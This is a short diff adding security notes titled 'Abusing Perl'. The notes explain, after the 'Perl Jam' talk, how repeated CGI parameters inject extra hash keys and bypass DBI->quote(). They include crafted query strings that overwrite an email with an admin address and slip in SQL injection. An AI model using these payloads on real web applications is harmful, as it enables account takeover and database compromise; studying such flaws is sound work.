@@ -1,0 +1,46 @@
+= Abusing Perl
+
+== Automatic list expansion
+
+=== CGI
+
+Use CGI parameter lists to affect hashes using cgi parameters
+
+Ex following code:
+
+    CreateUser({
+        name => $db_name,
+        email => $db_email,
+        login => $cgi->param('login'),
+    });
+
+Given: url?login=abc&login=email&login=admin@bugzilla.com
+
+Will create following hash due to list expansion inside hash context:
+
+    CreateUser({
+        name => $db_name,
+        email => $db_email,
+        login => 'abc',
+        email => 'admin@bugzilla.com',
+    });
+
+=== DBI
+
+Bypass DBI->quote() because its second argument is type and you can tell
+integer (which skips filtering). Pretty bad..
+
+    $dbi->quote($cgi->param('user'));
+
+Given: url?user=admin'&user=2
+
+Will yield
+
+    $dbi->quote( ("admin'", 2 ) );
+
+2 turns out is a constant in the quote function that will skip checks (thinks
+input is an Integer). Weird bug.
+
+== References
+
+* The Perl Jam, https://media.ccc.de/v/31c3_-_6243_-_en_-_saal_1_-_201412292200_-_the_perl_jam_exploiting_a_20_year-old_vulnerability_-_netanel_rubin#video&t=879
